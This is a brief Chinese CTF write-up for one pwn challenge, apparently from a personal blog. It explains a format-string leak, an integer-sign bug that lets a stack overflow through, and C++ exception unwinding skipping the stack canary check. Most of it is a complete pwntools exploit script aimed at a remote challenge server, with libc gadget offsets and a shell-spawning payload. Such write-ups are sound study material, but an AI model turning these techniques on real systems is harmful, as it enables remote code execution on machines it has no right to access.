趁着摸鱼空闲的时候做了下，只有一道pwn题，栈溢出不难。还是学到了新东西

一个简单格式化fmt用于leak和补码问题造成的栈溢出

这题重点是C++异常处理后会进行栈回退还有不会堆canary进行检查

出题人故意降低难度可以栈迁移到heap，不过我这没有用，leak出栈地址直接在栈上操作也可以，不过在布置的时候需要小心，不然会unwind会出错

```python
from pwn import *

#context.log_level = "debug"

bin = ELF("./exploit_1")
libc = bin.libc
#p = bin.process()
p = remote("118.25.216.151",10001)
def Debug(cmd=""):
    gdb.attach(p,cmd)

def name(context):
    p.sendlineafter("name:\n",context)

def motto(size,context):
    p.sendlineafter("motto:\n",str(size))
    p.sendlineafter("motto:\n",context)

#Debug("b *0x400E3d\nc\n")
payload = "AAA%pBBB%p"
name(payload)
p.recvuntil("AAA")
stack = int(p.recv(14),16)
p.recvuntil("BBB")
libc.address = int(p.recv(14),16)-0x6cf780+0x309000
success("stack-->"+hex(stack))
success("libc-->"+hex(libc.address))

payload  = payload.ljust(0x410,"A")
payload += p64(stack+0x002720)+p64(0x400ed2)
payload += p64(libc.address+0x4526a)*6
payload += p64(0x400f40)+p64(libc.address+0x45216)

motto(-9223372036854775809,payload)
p.interactive()
```

本来想做re的，结果又去降智商玩OSU去了